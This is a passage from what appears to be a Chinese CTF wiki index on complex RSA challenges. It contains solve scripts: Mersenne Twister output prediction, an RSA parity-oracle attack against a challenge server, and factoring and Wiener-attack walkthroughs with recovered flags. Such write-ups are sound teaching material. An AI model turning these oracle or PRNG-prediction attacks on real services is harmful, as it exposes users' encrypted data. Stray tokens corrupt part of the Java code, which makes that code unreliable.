\u768416\u5b57\u8282\u4e4b\u540e\u7684\u5185\u5bb9\u4e86\uff0c\u4f46\u662f\u524d16\u4e2a\u5b57\u8282\u6ca1\u6709 IV \u662f\u89e3\u5bc6\u4e0d\u4e86\u7684\u3002\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0cIV \u751f\u6210\u4f7f\u7528\u7684\u968f\u673a\u6570\u4f7f\u7528\u4e86 getrandbits\uff0c\u5e76\u4e14\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u5230\u8db3\u591f\u591a\u7684\u968f\u673a\u6570\u91cf\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c PRNG \u7684 predict\uff0c\u4ece\u800c\u76f4\u63a5\u83b7\u53d6\u968f\u673a\u6570 \u8fd9\u91cc\u4f7f\u7528\u4e86\u4e00\u4e2a\u73b0\u6210\u7684\u7684 java \u8fdb\u884c PRNG \u7684 Predict public class Main { static int [] state ; static int currentIndex ; 40 huo public static void main ( String [] args ) { state = new int [ 624 ] ; currentIndex = 0 ; // initialize(0); // for (int i = 0; i < 5; i++) { // System.out.println(state[i]); // } // for (int i = 0; i < 5; i++) { // System.out.println(nextNumber()); // } if ( args . length != 624 ) { System . err . println ( \"must be 624 args\" ); System . exit ( 1 ); } int [] arr = new int [ 624 ] ; for ( int i = 0 ; i < args . length ; i ++ ) { arr [ i ] = Integer . parseInt ( args [ i ] ); } rev ( arr ); for ( int i = 0 ; i < 6240 huo4 ; i ++ ) { System . out . println ( state [ i ] ); } // System.out.println(\"currentIndex \" + currentIndex); // System.out.println(\"state[currentIndex] \" + state[currentIndex]); // System.out.println(\"next \" + nextNumber()); // want -2065863258 } static void nextState () { // Iterate through the state for ( int i = 0 ; i < 624 ; i ++ ) { // y is the first bit of the current number, // and the last 31 bits of the next number int y = ( state [ i ] & 0x80000000 ) + ( state [ ( i + 1 ) % 624 ] & 0x7fffffff ); // first bitshift y by 1 to the right int next = y >>> 1 ; // xor it with the 397th next number next ^= state [ ( i + 397 ) % 624 ] ; // if y is odd, xor with magic number if (( y & 1L ) == 1L ) { next ^= 0x9908b0df ; } // now we have the result state [ i ] = next ; } } static int nextNumber () { currentIndex ++ ; int tmp = state [ currentIndex ] ; tmp ^= ( tmp >>> 11 ); tmp ^= ( tmp << 7 ) & 0x9d2c5680 ; tmp ^= ( tmp << 15 ) & 0xefc60000 ; tmp ^= ( tmp >>> 18 ); return tmp ; } static void initialize ( int seed ) { // http://code.activestate.com/recipes/578056-mersenne-twister/ // global MT // global bitmask_1 // MT[0] = seed // for i in xrange(1,624): // MT[i] = ((1812433253 * MT[i-1]) ^ ((MT[i-1] >> 30) + i)) & bitmask_1 // copied Python 2.7's impl (probably uint problems) state [ 0 ] = seed ; for ( int i = 1 ; i < 624 ; i ++ ) { state [ i ] = (( 1812433253 * state [ i - 1 ] ) ^ (( state [ i - 1 ] >> 30 ) + i )) & 0xffffffff ; } } static int unBitshiftRightXor ( int value , int shift ) { // we part of the value we are up to (with a width of shift bits) int i = 0 ; // we accumulate the result here int result = 0 ; // iterate until we've done the full 32 bits while ( i * shift < 32 ) { // create a mask for this part int partMask = ( - 1 << ( 32 - shift )) >>> ( shift * i ); // obtain the part int part = value & partMask ; // unapply the xor from the next part of the integer value ^= part >>> shift ; // add the part to the result result |= part ; i ++ ; } return result ; } static int unBitshiftLeftXor ( int value , int shift , int mask ) { // we part of the value we are up to (with a width of shift bits) int i = 0 ; // we accumulate the result here int result = 0 ; // iterate until we've done the full 32 bits while ( i * shift < 32 ) { // create a mask for this part int partMask = ( - 1 >>> ( 32 - shift )) << ( shift * i ); // obtain the part int part = value & partMask ; // unapply the xor from the next part of the integer value ^= ( part << shift ) & mask ; // add the part to the result result |= part ; i ++ ; } return result ; } static void rev ( int [] nums ) { for ( int i = 0 ; i < 624 ; i ++ ) { int value = nums [ i ] ; value = unBitshiftRightXor ( value , 18 ); value = unBitshiftLeftXor ( value , 15 , 0xefc60000 ); value = unBitshiftLeftXor ( value , 7 , 0x9d2c5680 ); value = unBitshiftRightXor ( value , 11 ); state [ i ] = value ; } } } \u5199\u4e86\u4e00\u4e2a python \u76f4\u63a5\u8c03\u7528 java from Crypto.Util.number import long_to_bytes,bytes_to_long def encrypt_io(io,p): io.read_until(\"4: get encrypted keyn\") io.writeline(\"1\") io.read_until(\"input plain text: \") io.writeline(p) io.read_until(\"RSA: \") rsa_c=int(io.readline()[:-1],16) io.read_until(\"AES: \") aes_c=io.readline()[:-1].decode(\"hex\") return rsa_c,aes_c import subprocess import random def get_iv(io): rsa_c, aes_c=encrypt_io(io,\"1\") return bytes_to_long(aes_c[0:16]) def splitInto32(w128): w1 = w128 & (2**32-1) w2 = (w128 >> 32) & (2**32-1) w3 = (w128 >> 64) & (2**32-1) w4 = (w128 >> 96) return w1,w2,w3,w4 def sign(iv): # converts a 32 bit uint to a 32 bit signed int if(iv&0x80000000): iv = -0x100000000 + iv return iv def get_state(io): numbers=[] for i in range(156): print i numbers.append(get_iv(io)) observedNums = [sign(w) for n in numbers for w in splitInto32(n)] o = subprocess.check_output([\"java\", \"Main\"] + map(str, observedNums)) stateList = [int(s) % (2 ** 32) for s in o.split()] r = random.Random() state = (3, tuple(stateList + [624]), None) r.setstate(state) return r.getrandbits(128)","title":"PRNG Predict"},{"location":"crypto/asymmetric/rsa/rsa_complex/#exp","text":"\u6574\u4f53\u653b\u51fb\u4ee3\u7801\u5982\u4e0b\uff1a from zio import * import primefac from Crypto.Util.number import long_to_bytes , bytes_to_long target = ( \"crypto.chal.ctf.westerns.tokyo\" , 5643 ) e = 65537 def get_enc_key ( io ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( \"4\" ) io . read_until ( \"here is encrypted key :)n\" ) c = int ( io . readline ()[: - 1 ], 16 ) return c def encrypt_io ( io , p ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( \"1\" ) io . read_until ( \"input plain text: \" ) io . writeline ( p ) io . read_until ( \"RSA: \" ) rsa_c = int ( io . readline ()[: - 1 ], 16 ) io . read_until ( \"AES: \" ) aes_c = io . readline ()[: - 1 ] . decode ( \"hex\" ) return rsa_c , aes_c def decrypt_io ( io , c ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( \"2\" ) io . read_until ( \"input hexencoded cipher text: \" ) io . writeline ( long_to_bytes ( c ) . encode ( \"hex\" )) io . read_until ( \"RSA: \" ) return io . read_line ()[: - 1 ] . decode ( \"hex\" ) def get_n ( io ): rsa_c , aes_c = encrypt_io ( io , long_to_bytes ( 2 )) n = pow ( 2 , 65537 ) - rsa_c for i in range ( 3 , 6 ): rsa_c , aes_c = encrypt_io ( io , long_to_bytes ( i )) n = primefac . gcd ( n , pow ( i , 65537 ) - rsa_c ) return n def check_n ( io , n ): rsa_c , aes_c = encrypt_io ( io , \"123\" ) if pow ( bytes_to_long ( \"123\" ), e , n ) == rsa_c : return True else : return False import gmpy2 def guess_m ( io , n , c ): k = 1 lb = 0 ub = n while ub != lb : print lb , ub tmp = c * gmpy2 . powmod ( 2 , k * e , n ) % n if ord ( decrypt_io ( io , tmp )[ - 1 ]) % 2 == 1 : lb = ( lb + ub ) / 2 else : ub = ( lb + ub ) / 2 k += 1 print ub , len ( long_to_bytes ( ub )) return ub io = zio ( target , timeout = 10000 , print_read = COLORED ( NONE , 'red' ), print_write = COLORED ( NONE , 'green' )) n = get_n ( io ) print check_n ( io , n ) c = get_enc_key ( io ) print len ( decrypt_io ( io , c )) == 16 m = guess_m ( io , n , c ) for i in range ( m - 50000 , m + 50000 ): if pow ( i , e , n ) == c : aeskey = i print long_to_bytes ( aeskey )[ - 1 ] == decrypt_io ( io , c )[ - 1 ] print \"found aes key\" , hex ( aeskey ) import fuck_r next_iv = fuck_r . get_state ( io ) print \"##########################################\" print next_iv print aeskey io . interact ()","title":"EXP"},{"location":"crypto/asymmetric/rsa/rsa_complex/#2016-asis-find-the-flag","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 ASIS 2016 \u7ebf\u4e0a\u8d5b\u4e2d Find the flag \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u6587\u4ef6\u89e3\u538b\u51fa\u6765\uff0c\u6709\u4e00\u4e2a\u5bc6\u6587\uff0c\u4e00\u4e2a\u516c\u94a5\uff0c\u4e00\u4e2a py \u811a\u672c\u3002\u770b\u4e00\u4e0b\u516c\u94a5\u3002 \u279c RSA openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 256 bit ) Modulus: 00 :d8:e2:4c:12:b7:b9:9e:fe:0a:9b:c0:4a:6a:3d: f5:8a:2a:94:42:69:b4:92:b7:37:6d:f1:29:02:3f: 20 :61:b9 Exponent: 12405943493775545863 ( 0xac2ac3e0ca0f5607 ) Modulus = D8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9 \u8fd9\u4e48\u5c0f\u7684\u4e00\u4e2a N N \uff0c\u5148\u5206\u89e3\u4e00\u4e0b\u3002 p = 311155972145869391293781528370734636009 q = 315274063651866931016337573625089033553 \u518d\u770b\u7ed9\u7684 py \u811a\u672c\u3002 #!/usr/bin/python import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 flag = open ( 'flag' , 'r' ) . read () * 30 def ext_rsa_encrypt ( p , q , e , msg ): m = bytes_to_long ( msg ) while True : n = p * q try : phi = ( p - 1 ) * ( q - 1 ) d = gmpy . invert ( e , phi ) pubkey = RSA . construct (( long ( n ), long ( e ))) key = PKCS1_v1_5 . new ( pubkey ) enc = key . encrypt ( msg ) . encode ( 'base64' ) return enc except : p = gmpy . next_prime ( p ** 2 + q ** 2 ) q = gmpy . next_prime ( 2 * p * q ) e = gmpy . next_prime ( e ** 2 ) p = getPrime ( 128 ) q = getPrime ( 128 ) n = p * q e = getPrime ( 64 ) pubkey = RSA . construct (( long ( n ), long ( e ))) f = open ( 'pubkey.pem' , 'w' ) f . write ( pubkey . exportKey ()) g = open ( 'flag.enc' , 'w' ) g . write ( ext_rsa_encrypt ( p , q , e , flag )) \u903b\u8f91\u5f88\u7b80\u5355\uff0c\u8bfb\u53d6 flag\uff0c\u91cd\u590d 30 \u904d\u4e3a\u5bc6\u6587\u3002\u968f\u673a\u53d6 p p \u548c q q \uff0c\u751f\u6210\u4e00\u4e2a\u516c\u94a5\uff0c\u5199\u5165 pubkey.pem \uff0c\u518d\u7528\u811a\u672c\u4e2d\u7684 ext_rsa_encrypt \u51fd\u6570\u8fdb\u884c\u52a0\u5bc6\uff0c\u6700\u540e\u5c06\u5bc6\u6587\u5199\u5165 flag.enc \u3002 \u5c1d\u8bd5\u4e00\u4e0b\u89e3\u5bc6\uff0c\u63d0\u793a\u5bc6\u6587\u8fc7\u957f\uff0c\u518d\u770b\u52a0\u5bc6\u51fd\u6570\uff0c\u539f\u6765\u5f53\u52a0\u5bc6\u5931\u8d25\u65f6\uff0c\u51fd\u6570\u4f1a\u8df3\u5230\u5f02\u5e38\u5904\u7406\uff0c\u4ee5\u4e00\u5b9a\u7b97\u6cd5\u91cd\u65b0\u53d6\u66f4\u5927\u7684 p p \u548c q q \uff0c\u76f4\u5230\u52a0\u5bc6\u6210\u529f\u3002 \u90a3\u4e48\u6211\u4eec\u53ea\u8981\u4e5f\u5199\u4e00\u4e2a\u76f8\u5e94\u7684\u89e3\u5bc6\u51fd\u6570\u5373\u53ef\u3002 #!/usr/bin/python import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 def ext_rsa_decrypt ( p , q , e , msg ): m = bytes_to_long ( msg ) while True : n = p * q try : phi = ( p - 1 ) * ( q - 1 ) d = gmpy . invert ( e , phi ) privatekey = RSA . construct (( long ( n ), long ( e ), long ( d ), long ( p ), long ( q ))) key = PKCS1_v1_5 . new ( privatekey ) de_error = '' enc = key . decrypt ( msg . decode ( 'base64' ), de_error ) return enc except Exception as error : print error p = gmpy . next_prime ( p ** 2 + q ** 2 ) q = gmpy . next_prime ( 2 * p * q ) e = gmpy . next_prime ( e ** 2 ) p = 311155972145869391293781528370734636009 q = 315274063651866931016337573625089033553 n = p * q e = 12405943493775545863 # pubkey = RSA.construct((long(n), long(e))) # f = open('pubkey.pem', 'w') # f.write(pubkey.exportKey()) g = open ( 'flag.enc' , 'r' ) msg = g . read () flag = ext_rsa_decrypt ( p , q , e , msg ) print flag \u62ff\u5230 flag ASIS{F4ct0R__N_by_it3rat!ng!}","title":"2016 ASIS Find the flag"},{"location":"crypto/asymmetric/rsa/rsa_complex/#sctf-rsa1","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA1 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9996\u5148\u89e3\u538b\u538b\u7f29\u5305\u540e\uff0c\u5f97\u5230\u5982\u4e0b\u6587\u4ef6 \u279c level0 git: ( master ) \u2717 ls -al \u603b\u7528\u91cf 4 drwxrwxrwx 1 root root 0 7\u6708 30 16 :36 . drwxrwxrwx 1 root root 0 7\u6708 30 16 :34 .. -rwxrwxrwx 1 root root 349 5\u6708 2 2016 level1.passwd.enc -rwxrwxrwx 1 root root 2337 5\u6708 6 2016 level1.zip -rwxrwxrwx 1 root root 451 5\u6708 2 2016 public.key \u5c1d\u8bd5\u89e3\u538b\u7f29\u4e86\u4e00\u4e0b level1.zip \u73b0\u9700\u8981\u5bc6\u7801\u3002\u7136\u540e\u6839\u636e level1.passwd.enc \u53ef\u77e5\uff0c\u5e94\u8be5\u662f\u6211\u4eec\u9700\u8981\u89e3\u5bc6\u8fd9\u4e2a\u6587\u4ef6\u624d\u80fd\u5f97\u5230\u5bf9\u5e94\u7684\u5bc6\u7801\u3002\u67e5\u770b\u516c\u94a5 \u279c level0 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 2048 bit ) Modulus: 00 :94:a0:3e:6e:0e:dc:f2:74:10:52:ef:1e:ea:a8: 89 :d6:f9:8d:01:11:51:db:5e:90:92:48:fd:39:0c: 70 :87:24:d8:98:3c:f3:33:1c:ba:c5:61:c2:ce:2c: 5a:f1:5e:65:b2:b2:46:91:56:b6:19:d5:d3:b2:a6: bb:a3:7d:56:93:99:4d:7e:4c:2f:aa:60:7b:3e:c8: fc:90:b2:00:62:4b:53:18:5b:a2:30:10:60:a8:21: ab:61:57:d7:e7:cc:67:1b:4d:cd:66:4c:7d:f1:1a: 2a:1d:5e:50:80:c1:5e:45:12:3a:ba:4a:53:64:d8: 72 :1f:84:4a:ae:5c:55:02:e8:8e:56:4d:38:70:a5: 16 :36:d3:bc:14:3e:2f:ae:2f:31:58:ba:00:ab:ac: c0:c5:ba:44:3c:29:70:56:01:6b:57:f5:d7:52:d7: 31 :56:0b:ab:0a:e6:8d:ad:08:22:a9:1f:cb:6e:49: cc:01:4c:12:d2:ab:a3:a5:97:e5:10:49:19:7f:69: d9:3b:c5:53:53:71:00:18:60:cc:69:1a:06:64:3b: 86 :94:70:a9:da:82:fc:54:6b:06:23:43:2d:b0:20: eb:b6:1b:91:35:5e:53:a6:e5:d8:9a:84:bb:30:46: b8:9f:63:bc:70:06:2d:59:d8:62:a5:fd:5c:ab:06: 68 :81 Exponent: 65537 ( 0x10001 ) Modulus = 94A03E6E0EDCF2741052EF1EEAA889D6F98D011151DB5E909248FD390C708724D8983CF3331CBAC561C2CE2C5AF15E65B2B2469156B619D5D3B2A6BBA37D5693994D7E4C2FAA607B3EC8FC90B200624B53185BA2301060A821AB6157D7E7CC671B4DCD664C7DF11A2A1D5E5080C15E45123ABA4A5364D8721F844AAE5C5502E88E564D3870A51636D3BC143E2FAE2F3158BA00ABACC0C5BA443C297056016B57F5D752D731560BAB0AE68DAD0822A91FCB6E49CC014C12D2ABA3A597E51049197F69D93BC5535371001860CC691A06643B869470A9DA82FC546B0623432DB020EBB61B91355E53A6E5D89A84BB3046B89F63BC70062D59D862A5FD5CAB066881 writing RSA key -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlKA+bg7c8nQQUu8e6qiJ 1vmNARFR216Qkkj9OQxwhyTYmDzzMxy6xWHCzixa8V5lsrJGkVa2GdXTsqa7o31W k5lNfkwvqmB7Psj8kLIAYktTGFuiMBBgqCGrYVfX58xnG03NZkx98RoqHV5QgMFe RRI6ukpTZNhyH4RKrlxVAuiOVk04cKUWNtO8FD4vri8xWLoAq6zAxbpEPClwVgFr V/XXUtcxVgurCuaNrQgiqR/LbknMAUwS0qujpZflEEkZf2nZO8VTU3EAGGDMaRoG ZDuGlHCp2oL8VGsGI0MtsCDrthuRNV5TpuXYmoS7MEa4n2O8cAYtWdhipf1cqwZo gQIDAQAB -----END PUBLIC KEY----- \u53d1\u73b0\u867d\u7136\u8bf4\u662f 2048 \u4f4d\uff0c\u4f46\u662f\u663e\u7136\u6a21\u6570\u6ca1\u6709\u90a3\u4e48\u957f\uff0c\u5c1d\u8bd5\u5206\u89e3\u4e0b\uff0c\u5f97\u5230 p=250527704258269 q=74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349 \u7136\u540e\u5c31\u53ef\u4ee5\u6784\u9020\uff0c\u5e76\u4e14\u89e3\u5bc6\uff0c\u4ee3\u7801\u5982\u4e0b from Crypto.PublicKey import RSA import gmpy2 from base64 import b64decode p = 250527704258269 q = 74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349 e = 65537 n = p * q def getprivatekey ( n , e , p , q ): phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) priviatekey = RSA . construct (( long ( n ), long ( e ), long ( d ))) with open ( 'private.pem' , 'w' ) as f : f . write ( priviatekey . exportKey ()) def decrypt (): with open ( './level1.passwd.enc' ) as f : cipher = f . read () cipher = b64decode ( cipher ) with open ( './private.pem' ) as f : key = RSA . importKey ( f ) print key . decrypt ( cipher ) #getprivatekey(n, e, p, q) decrypt () \u53d1\u73b0\u4e0d\u5bf9 \u279c level0 git: ( master ) \u2717 python exp.py \u4e00\u5806\u4e71\u7801\u3002\u3002 \u8fd9\u65f6\u5019\u5c31\u8981\u8003\u8651\u5176\u4ed6\u60c5\u51b5\u4e86\uff0c\u4e00\u822c\u6765\u8bf4\u73b0\u5b9e\u4e2d\u5b9e\u73b0\u7684 RSA \u90fd\u4e0d\u4f1a\u76f4\u63a5\u7528\u539f\u751f\u7684 RSA\uff0c\u90fd\u4f1a\u52a0\u4e00\u4e9b\u586b\u5145\u6bd4\u5982 OAEP\uff0c\u6211\u4eec\u8fd9\u91cc\u8bd5\u8bd5\uff0c\u4fee\u6539\u4ee3\u7801 def decrypt1 () : with open ( './level1.passwd.enc' ) as f: cipher = f.read () cipher = b64decode ( cipher ) with open ( './private.pem' ) as f: key = RSA.importKey ( f ) key = PKCS1_OAEP.new ( key ) print key.decrypt ( cipher ) \u679c\u7136\u5982\u6b64\uff0c\u5f97\u5230 \u279c level0 git: ( master ) \u2717 python exp.py FaC5ori1ati0n_aTTA3k_p_tOO_sma11 \u5f97\u5230\u89e3\u538b\u5bc6\u7801\u3002\u7ee7\u7eed\uff0c\u67e5\u770b level1 \u4e2d\u7684\u516c\u94a5 \u279c level1 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 2048 bit ) Modulus: 00 :c3:26:59:69:e1:ed:74:d2:e0:b4:9a:d5:6a:7c: 2f:2a:9e:c3:71:ff:13:4b:10:37:c0:6f:56:19:34: c5:cb:1f:6d:c0:e3:57:3b:47:c4:76:3e:21:a3:b0: 11 :11:78:d4:ee:4f:e8:99:2b:15:cb:cb:d7:73:e4: f9:a6:28:20:fd:db:8c:ea:16:ed:67:c2:48:12:6e: 4b:01:53:4a:67:cb:22:23:3b:34:2e:af:13:ef:93: 45 :16:2b:00:9f:e0:4b:d1:90:c9:2c:27:9a:34:c3: 3f:d7:ee:40:f5:82:50:39:aa:8c:e9:c2:7b:f4:36: e3:38:9d:04:50:db:a9:b7:3f:4b:2a:d6:8a:2a:5c: 87 :2a:eb:74:35:98:6a:9c:e4:52:cb:93:78:d2:da: 39 :83:f3:0c:d1:65:1e:66:9c:40:56:06:0d:58:fc: 41 :64:5e:06:da:83:d0:3b:06:42:70:da:38:53:e0: 54 :35:53:ce:de:79:4a:bf:f5:3b:e5:53:7f:6c:18: 12 :67:a9:de:37:7d:44:65:5e:68:0a:78:39:3d:bb: 00 :22:35:0e:a3:94:e6:94:15:1a:3d:39:c7:50:0e: b1:64:a5:29:a3:69:41:40:69:94:b0:0d:1a:ea:9a: 12 :27:50:ee:1e:3a:19:b7:29:70:b4:6d:1e:9d:61: 3e:7d Exponent: 65537 ( 0x10001 ) Modulus = C3265969E1ED74D2E0B49AD56A7C2F2A9EC371FF134B1037C06F561934C5CB1F6DC0E3573B47C4763E21A3B0111178D4EE4FE8992B15CBCBD773E4F9A62820FDDB8CEA16ED67C248126E4B01534A67CB22233B342EAF13EF9345162B009FE04BD190C92C279A34C33FD7EE40F5825039AA8CE9C27BF436E3389D0450DBA9B73F4B2AD68A2A5C872AEB7435986A9CE452CB9378D2DA3983F30CD1651E669C4056060D58FC41645E06DA83D03B064270DA3853E0543553CEDE794ABFF53BE5537F6C181267A9DE377D44655E680A78393DBB0022350EA394E694151A3D39C7500EB164A529A36941406994B00D1AEA9A122750EE1E3A19B72970B46D1E9D613E7D writing RSA key -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwyZZaeHtdNLgtJrVanwv Kp7Dcf8TSxA3wG9WGTTFyx9twONXO0fEdj4ho7AREXjU7k/omSsVy8vXc+T5pigg /duM6hbtZ8JIEm5LAVNKZ8siIzs0Lq8T75NFFisAn+BL0ZDJLCeaNMM/1+5A9YJQ OaqM6cJ79DbjOJ0EUNuptz9LKtaKKlyHKut0NZhqnORSy5N40to5g/MM0WUeZpxA VgYNWPxBZF4G2oPQOwZCcNo4U+BUNVPO3nlKv/U75VN/bBgSZ6neN31EZV5oCng5 PbsAIjUOo5TmlBUaPTnHUA6xZKUpo2lBQGmUsA0a6poSJ1DuHjoZtylwtG0enWE+ fQIDAQAB -----END PUBLIC KEY----- \u4f3c\u4e4e\u8fd8\u662f\u4e0d\u662f\u5f88\u5927\uff0c\u518d\u6b21\u5206\u89e3\uff0c\u7136\u540e\u8bd5\u4e86 factordb \u4e0d\u884c\uff0c\u8bd5\u8bd5 yafu\u3002\u7ed3\u679c\u5206\u89e3\u51fa\u6765\u4e86\u3002 P309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496383 P309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496259 \u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e24\u4e2a\u6570\u975e\u5e38\u76f8\u8fd1\uff0c\u53ef\u80fd\u662f factordb \u6ca1\u6709\u5b9e\u73b0\u8fd9\u7c7b\u5206\u89e3\u3002 \u7ee7\u800c\u4e0b\u9762\u7684\u64cd\u4f5c\u7c7b\u4f3c\u4e8e level0\u3002\u53ea\u662f\u8fd9\u6b21\u662f\u76f4\u63a5\u89e3\u5bc6\u5c31\u597d\uff0c\u6ca1\u5565\u586b\u5145\uff0c\u8bd5\u4e86\u586b\u5145\u53cd\u800c\u9519 \u5f97\u5230\u5bc6\u7801 fA35ORI11TLoN_Att1Ck_cL0sE_PrI8e_4acTorS \u3002\u7ee7\u7eed\u4e0b\u4e00\u6b65\uff0c\u67e5\u770b\u516c\u94a5 \u279c level2 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 1025 bit ) Modulus: 01 :ba:0c:c2:45:b4:5c:e5:b5:f5:6c:d5:ca:a5:90: c2:8d:12:3d:8a:6d:7f:b6:47:37:fb:7c:1f:5a:85: 8c:1e:35:13:8b:57:b2:21:4f:f4:b2:42:24:5f:33: f7:2c:2c:0d:21:c2:4a:d4:c5:f5:09:94:c2:39:9d: 73 :e5:04:a2:66:1d:9c:4b:99:d5:38:44:ab:13:d9: cd:12:a4:d0:16:79:f0:ac:75:f9:a4:ea:a8:7c:32: 16 :9a:17:d7:7d:80:fd:60:29:64:c7:ea:50:30:63: 76 :59:c7:36:5e:98:d2:ea:5b:b3:3a:47:17:08:2d: d5:24:7d:4f:a7:a1:f0:d5:73 Exponent: 01 :00:8e:81:dd:a0:e3:19:28:e8:ee:51:11:08:c7: 50 :5f:61:31:05:d2:e2:ff:9b:83:71:e4:29:c2:dd: 92 :70:65:d4:09:6d:58:c3:76:31:07:f1:d4:fc:cf: 2d:b3:0a:6d:02:7c:56:61:7c:be:7e:0b:7e:d9:22: 28 :66:9e:fb:3d:2f:2c:20:59:3c:21:ef:ff:31:00: 6a:fb:a7:68:de:4a:0a:4c:1a:a7:09:d5:48:98:c8: 1f:cf:fb:dd:f7:9c:ae:ae:0b:15:f4:b2:c7:e0:bc: ba:31:4f:5e:07:83:ad:0e:7f:b9:82:a4:d2:01:fa: 68 :29:6d:66:7c:cf:57:b9:4b Modulus = 1BA0CC245B45CE5B5F56CD5CAA590C28D123D8A6D7FB64737FB7C1F5A858C1E35138B57B2214FF4B242245F33F72C2C0D21C24AD4C5F50994C2399D73E504A2661D9C4B99D53844AB13D9CD12A4D01679F0AC75F9A4EAA87C32169A17D77D80FD602964C7EA5030637659C7365E98D2EA5BB33A4717082DD5247D4FA7A1F0D573 writing RSA key -----BEGIN PUBLIC KEY----- MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQG6DMJFtFzltfVs1cqlkMKN Ej2KbX+2Rzf7fB9ahYweNROLV7IhT/SyQiRfM/csLA0hwkrUxfUJlMI5nXPlBKJm HZxLmdU4RKsT2c0SpNAWefCsdfmk6qh8MhaaF9d9gP1gKWTH6lAwY3ZZxzZemNLq W7M6RxcILdUkfU+nofDVcwKBgQEAjoHdoOMZKOjuUREIx1BfYTEF0uL/m4Nx5CnC 3ZJwZdQJbVjDdjEH8dT8zy2zCm0CfFZhfL5+C37ZIihmnvs9LywgWTwh7/8xAGr7 p2jeSgpMGqcJ1UiYyB/P+933nK6uCxX0ssfgvLoxT14Hg60Of7mCpNIB+mgpbWZ8 z1e5Sw == -----END PUBLIC KEY----- \u53d1\u73b0\u79c1\u94a5 e \u548c n \u51e0\u4e4e\u4e00\u6837\u5927\uff0c\u8003\u8651 d \u6bd4\u8f83\u5c0f\uff0c\u4f7f\u7528 Wiener's Attack\u3002\u5f97\u5230 d\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u518d\u6b21\u9a8c\u8bc1\u4e00\u904d\u3002 \u279c level2 git: ( master ) \u2717 python RSAwienerHacker.py Testing Wiener Attack Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- \u8fd9\u65f6\u6211\u4eec\u89e3\u5bc6\u5bc6\u6587\uff0c\u89e3\u5bc6\u4ee3\u7801\u5982\u4e0b from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 , PKCS1_OAEP import gmpy2 from base64 import b64decode d = 29897859398360008828023114464512538800655735360280670512160838259524245332403 L with open ( './public.key' ) as f : key = RSA . importKey ( f ) n = key . n e = key . e def getprivatekey ( n , e , d ): priviatekey = RSA . construct (( long ( n ), long ( e ), long ( d ))) with open ( 'private.pem' , 'w' ) as f : f . write ( priviatekey . exportKey ()) def decrypt (): with open ( './level3.passwd.enc' ) as f : cipher = f . read () with open ( './private.pem' ) as f : key = RSA . importKey ( f ) print key . decrypt ( cipher ) getprivatekey ( n , e , d ) decrypt () \u5229\u7528\u672b\u5c3e\u7684\u5b57\u7b26\u4e32 wIe6ER1s_1TtA3k_e_t00_larg3 \u89e3\u5bc6\u538b\u7f29\u5305\uff0c\u6ce8\u610f\u53bb\u6389 B\u3002\u81f3\u6b64\u5168\u90e8\u89e3\u5bc6\u7ed3\u675f\uff0c\u5f97\u5230 flag\u3002","title":"SCTF RSA1"},{"location":"crypto/asymmetric/rsa/rsa_complex/#2018-wctf-rsa","text":"\u9898\u76ee\u57fa\u672c\u63cf\u8ff0\u4e3a Description: Encrypted message for user \"admin\": 